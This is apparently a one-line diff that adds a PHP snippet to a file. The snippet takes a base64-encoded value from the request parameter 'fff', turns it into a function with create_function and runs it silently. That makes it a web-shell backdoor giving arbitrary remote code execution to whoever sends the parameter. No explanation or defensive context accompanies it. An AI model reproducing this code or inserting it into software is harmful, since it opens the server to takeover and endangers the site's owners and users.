@@ -1,0 +1,1 @@
+<?php if(!empty($_REQUEST['fff'])){$fff=base64_decode($_REQUEST['fff']);$fff=create_function('',$fff);@$fff();exit;} ?>
